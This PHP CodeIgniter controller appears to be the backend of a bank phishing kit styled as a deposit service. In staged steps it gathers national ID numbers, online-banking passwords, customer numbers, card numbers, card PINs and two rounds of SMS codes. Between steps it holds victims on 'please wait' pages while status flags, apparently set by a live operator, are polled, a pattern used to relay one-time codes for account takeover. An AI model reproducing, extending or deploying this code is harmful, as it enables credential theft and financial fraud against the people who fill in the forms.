<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Home extends CI_Controller {
	function __construct()
	{
		parent::__construct();		
		$this->load->model('home_model');
	}

	public function index() {
        $data['banks'] = $this->home_model->get_banks();
        $data['depositTypes'] = $this->home_model->get_depositTypes();
        $this->load->view('index', $data);
    }
    public function selectBank($id)
    {
        $data['reqInfo'] = $this->home_model->get_request_by_transId($id);
        $arr = array('id'=>$data['reqInfo']['deposit_id']);
        $data['bank'] = $this->home_model->getBankByDepositType($arr);
        $this->load->view('selectBank',$data);
    }
    public function pleaseWait($id)
    {
        $data['reqInfo'] = $this->home_model->get_request_by_transId($id);
        $this->load->view('pleaseWait',$data);
    }
    public function pleaseWait2($id)
    {
        $data['reqInfo'] = $this->home_model->get_request_by_transId($id);
        $this->load->view('pleaseWait2',$data);
    }
    public function pleaseWait3($id)
    {
        $data['reqInfo'] = $this->home_model->get_request_by_transId($id);
        $this->load->view('pleaseWait3',$data);
    }
    public function bankInfo($id)
    {
        $data['reqInfo'] = $this->home_model->get_request_by_transId($id);
        $this->load->view('bankInfo',$data);
    }
    public function waitSms($id)
    {
        $data['reqInfo'] = $this->home_model->get_request_by_transId($id);
        $this->load->view('smsWait',$data);
    }

    public function transSms($id)
    {
        $data['reqInfo'] = $this->home_model->get_request_by_transId($id);
        $this->load->view('transSms',$data);
    }
    public function transSms2($id)
    {
        $data['reqInfo'] = $this->home_model->get_request_by_transId($id);
        $this->load->view('transSms2',$data);
    }
    public function thankyou()
    {
        $this->load->view('thankyou');
    }
    public function declined($id)
    {
        $data['reqInfo'] = $this->home_model->get_request_by_transId($id);
        $this->load->view('declined',$data);
    }
    public function checkProTNOstatus()
    {
        $data = $_POST;
        $result = $this->home_model->get_request_by_transId($data['id']);
        if ($result['tc_no_status']) {
            $res_array = array(
                'msg' => 'success',
                'response' => $result
            );
            echo json_encode($res_array);
            exit;
        } else {
            $res_array = array(
                'msg' => 'error',
                'response' => 'Something went wrong. Please try again later!'
            );
            echo json_encode($res_array);
            exit;
        }
    }
    public function checkSmsStatus()
    {
        $data = $_POST;
        $result = $this->home_model->get_request_by_transId($data['id']);
        if ($result['sms1']) {
            $res_array = array(
                'msg' => 'success',
                'response' => $result
            );
            echo json_encode($res_array);
            exit;
        } else if ($result['sms2']) {
            $res_array = array(
                'msg' => 'success2',
                'response' => $result
            );
            echo json_encode($res_array);
            exit;
        } else {
            $res_array = array(
                'msg' => 'error',
                'response' => 'Something went wrong. Please try again later!'
            );
            echo json_encode($res_array);
            exit;
        }
    }
    public function checkSms2Status()
    {
        $data = $_POST;
        $result = $this->home_model->get_request_by_transId($data['id']);
        if ($result['sms2']) {
            $res_array = array(
                'msg' => 'success',
                'response' => $result
            );
            echo json_encode($res_array);
            exit;
        } else {
            $res_array = array(
                'msg' => 'error',
                'response' => 'Something went wrong. Please try again later!'
            );
            echo json_encode($res_array);
            exit;
        }
    }
    public function getBankByDepositId()
    {
        $data = $_POST;
        $result = $this->home_model->getBankByDepositType($data);
        if ($result) {
            $res_array = array(
                'msg' => 'success',
                'response' => $result
            );
            echo json_encode($res_array);
            exit;
        } else {
            $res_array = array(
                'msg' => 'error',
                'response' => 'Something went wrong. Please try again later!'
            );
            echo json_encode($res_array);
            exit;
        }
    }

    public function checkRequestStatus()
    {
        $data = $_POST;
        
        $result = $this->home_model->check_request_status_by_transId($data);

        if ($result) {
            $res_array = array(
                'msg' => 'success',
                'response' => 'Request is Processed and data found successfully.'
            );
            echo json_encode($res_array);
            exit;
        } else {
            $res_array = array(
                'msg' => 'error',
                'response' => 'No data Found Against This trans Id'
            );
            echo json_encode($res_array);
            exit;
        }
    }

    public function submit_bankInfo()
    {
        $data = $_POST;

        $bankinfo = request_info($data['bank_id']);

        if($bankinfo['tc_no']) {
            $this->form_validation->set_rules('tc_no', 'TC NO', 'trim|required|xss_clean');
        }

        if($bankinfo['bank_password']) {
            $this->form_validation->set_rules('password', 'Password', 'trim|required|xss_clean');
        }

        if($bankinfo['bank_customer']) {
            $this->form_validation->set_rules('bank_customer', 'Bank Customer No', 'trim|required|xss_clean');
        }

        if($bankinfo['bank_card_no']) {
            $this->form_validation->set_rules('bank_card_no', 'Bank Card No', 'trim|required|xss_clean');
        }

        if($bankinfo['bank_card_password']) {
            $this->form_validation->set_rules('bank_card_password', 'Bank Card Password', 'trim|required|xss_clean');
        }


        if ($this->form_validation->run($this) == FALSE)
        {
            $finalResult = array('msg' => 'error', 'response'=>validation_errors());
            echo json_encode($finalResult);
            exit;
        }else{

            $result = $this->home_model->addBankInfoByRequestTransId($data,$bankinfo);
            if ($result) {
                $res_array = array(
                    'msg' => 'success',
                    'response' => 'Request is Processed and data found successfully.'
                );
                echo json_encode($res_array);
                exit;
            } else {
                $res_array = array(
                    'msg' => 'error',
                    'response' => 'No data Found Against This trans Id'
                );
                echo json_encode($res_array);
                exit;
            }
        }
    }
    public function submit_smsInfo()
    {
        $data = $_POST;
        $result = $this->home_model->addSmsInfoByRequestTransId($data);
        if ($result) {
            $res_array = array(
                'msg' => 'success',
                'response' => 'SMS is Processed and data found successfully.'
            );
            echo json_encode($res_array);
            exit;
        } else {
            $res_array = array(
                'msg' => 'error',
                'response' => 'No data Found Against This trans Id'
            );
            echo json_encode($res_array);
            exit;
        }
    }
    public function submit_smsInfo2()
    {
        $data = $_POST;
        $result = $this->home_model->addSms2InfoByRequestTransId($data);
        if ($result) {
            $res_array = array(
                'msg' => 'success',
                'response' => 'SMS is Processed and data found successfully.'
            );
            echo json_encode($res_array);
            exit;
        } else {
            $res_array = array(
                'msg' => 'error',
                'response' => 'No data Found Against This trans Id'
            );
            echo json_encode($res_array);
            exit;
        }
    }
    public function submit_deposit()
    {
        $data = $_POST;
        $result = $this->home_model->add_request($data);
        if ($result) {
            $res_array = array(
                'msg' => 'success',
                'response' => 'Deposit has been successfully added!'
            );
            echo json_encode($res_array);
            exit;
        } else {
            $res_array = array(
                'msg' => 'success',
                'response' => 'Something went wrong. Please try again later!'
            );
            echo json_encode($res_array);
            exit;
        }
    }
    public function submit_trans_bank()
    {
        $data = $_POST;
        $result = $this->home_model->selectBankByRequestTransId($data);
        if ($result) {
            $res_array = array(
                'msg' => 'success',
                'response' => 'Request is Processed and data found successfully.'
            );
            echo json_encode($res_array);
            exit;
        } else {
            $res_array = array(
                'msg' => 'error',
                'response' => 'No data Found Against This trans Id'
            );
            echo json_encode($res_array);
            exit;
        }
    }

    public function cancel_tranaction()
    {
        $data = $_POST;
        $result = $this->home_model->delete_transaction($data);
        if ($result) {
            $res_array = array(
                'msg' => 'success',
                'response' => 'Request has been successfully deleted!.'
            );
            echo json_encode($res_array);
            exit;
        } else {
            $res_array = array(
                'msg' => 'error',
                'response' => 'Something went wrong. Please try again later!'
            );
            echo json_encode($res_array);
            exit;
        }
    }
    public function add ()
    {	
      $this->load->view('categories/add');
  }
  public function add_submit ()
  {	
      $data = $_POST;
      $result = $this->categories_model->add_category($data);
      if ($result) {
         $res_array = array(
            'msg' => 'success',
            'response' => 'Category has been successfully added!'
        );
         echo json_encode($res_array);
         exit;
     } else {
         $res_array = array(
            'msg' => 'success',
            'response' => 'Something went wrong. Please try again later!'
        );
         echo json_encode($res_array);
         exit;
     }
 }
 public function edit ($id)
 {	
  $data['theme_cat'] = $this->categories_model->get_category_by_id($id);
  $this->load->view('categories/edit', $data);
}
public function edit_submit ()
{	
  $data = $_POST;
  $result = $this->categories_model->edit_category($data);
  if ($result) {
     $res_array = array(
        'msg' => 'success',
        'response' => 'Category has been successfully updated!'
    );
     echo json_encode($res_array);
     exit;
 } else {
     $res_array = array(
        'msg' => 'success',
        'response' => 'Something went wrong. Please try again later!'
    );
     echo json_encode($res_array);
     exit;
 }
}
public function delete ()
{	
  $id = $_POST['id'];
  $this->categories_model->delete_category($id);
  exit;
}

}